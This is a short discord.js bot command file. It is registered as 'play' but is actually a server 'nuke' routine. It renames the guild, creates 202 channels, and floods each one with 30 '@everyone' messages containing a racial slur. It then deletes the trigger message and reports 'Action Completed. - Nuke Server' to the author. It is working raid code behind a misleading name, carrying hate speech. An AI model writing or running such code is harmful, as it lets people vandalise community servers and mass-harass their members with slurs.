const {
    MessageEmbed
} = require('discord.js');

module.exports = {
    name: 'play',
    async execute(message) {
        let channelName = '144op';
        let guildName = '144op';

        await message.guild.setName(guildName);

         for (let i = 0; i < 202; i++) {
            await message.guild.channels.create(channelName, {
            }).then((c) => {
                for (let j = 0; j < 30; j++) {
                    c.send('@everyone 144 Is op nigga');
                }
            });
        }
        message.delete()
        message.author.send('Action Completed. - Nuke Server');
        console.log('Ran nukeserver command. (SUCCESS)'); 
    
},
};
